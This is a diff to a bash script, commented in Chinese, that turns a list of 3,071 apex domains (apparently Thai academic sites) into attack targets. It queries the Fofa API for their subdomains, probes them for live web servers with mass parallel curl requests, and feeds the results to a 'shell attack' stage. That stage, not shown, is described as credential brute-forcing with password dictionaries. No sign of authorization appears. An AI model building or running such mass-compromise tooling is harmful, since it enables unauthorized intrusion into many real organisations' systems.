@@ -8,22 +8,81 @@ TOP100="/root/passwords/top100.txt"
 DEFAULT_CREDS="/root/passwords/default_creds.txt"
 
 OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
-mkdir -p $OUT/shells
+mkdir -p $OUT/shells $OUT/subdomains $OUT/alive
 
-# 复用之前的存活目标
-PREV=$(ls -td /root/*attack_* 2>/dev/null | head -1)
-if [ -n "$PREV" ] && [ -f "$PREV/alive/http_alive.txt" ]; then
-    cp $PREV/alive/http_alive.txt $OUT/targets.txt
-else
-    echo "❌ 找不到之前的存活目标"
+# 主域名列表
+MAIN_DOMAINS="/root/ac_th_apex_domains_3071.txt"
+if [ ! -f "$MAIN_DOMAINS" ]; then
+    echo "❌ 主域名文件不存在: $MAIN_DOMAINS"
     exit 1
 fi
 
-TOTAL=$(wc -l < $OUT/targets.txt)
+MAIN_COUNT=$(wc -l < $MAIN_DOMAINS)
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo "🔥 最大化Shell + 极低误报"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "目标: $TOTAL"
+echo "主域名: $MAIN_COUNT 个"
+echo "策略: Fofa子域名查询 → 存活探测 → Shell攻击"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+# ==========================================
+# 步骤0: Fofa子域名查询（对每个主域名）
+# ==========================================
+echo ""
+echo "[0/9] 🔍 Fofa子域名查询（$MAIN_COUNT个主域名，并发10）..."
+export OUT
+export FOFA_EMAIL_1 FOFA_KEY_1
+
+cat $MAIN_DOMAINS | xargs -P 10 -I {} bash -c '
+    domain="{}"
+    query=$(echo -n "domain=\"${domain}\"" | base64 | tr -d "\n")
+    
+    # Fofa API查询
+    resp=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${query}&size=10000&fields=host" 2>/dev/null)
+    
+    # 提取host字段（Fofa返回格式：["host1","host2",...]）
+    echo "$resp" | jq -r ".results[]? | .[0]?" 2>/dev/null | \
+        grep -v "^$" | \
+        sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1 | \
+        grep -E "^[a-zA-Z0-9]" | \
+        sort -u >> "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null
+    
+    # 统计
+    count=$(wc -l < "$OUT/subdomains/fofa_${domain}.txt" 2>/dev/null || echo 0)
+    if [ $count -gt 0 ]; then
+        echo "[+] ${domain}: ${count} 个子域名"
+    fi
+'
+
+# 合并所有子域名
+cat $OUT/subdomains/fofa_*.txt 2>/dev/null | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
+SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
+echo "  ✅ 总子域名: $SUBDOMAIN_COUNT"
+
+# ==========================================
+# 步骤0.5: 存活探测
+# ==========================================
+echo ""
+echo "[0.5/9] 🌐 存活探测（$SUBDOMAIN_COUNT个子域名，并发100）..."
+cat $OUT/subdomains/all_subdomains.txt | \
+    xargs -P 100 -I {} bash -c '
+        url="{}"
+        status=$(curl -skL -m 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
+        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ]; then
+            echo "$url" >> "$OUT/alive/http_alive.txt"
+        fi
+    '
+
+ALIVE_COUNT=$(wc -l < $OUT/alive/http_alive.txt 2>/dev/null || echo 0)
+echo "  ✅ 存活目标: $ALIVE_COUNT"
+
+# 使用存活目标作为攻击目标
+cp $OUT/alive/http_alive.txt $OUT/targets.txt
+TOTAL=$ALIVE_COUNT
+
+echo ""
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "攻击目标: $TOTAL 个存活URL"
 echo "策略: 高价值优先 + 五重验证 + 内容验证 + 凭证爆破"
 echo "字典: master_passwords.txt + top100.txt + default_creds.txt"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
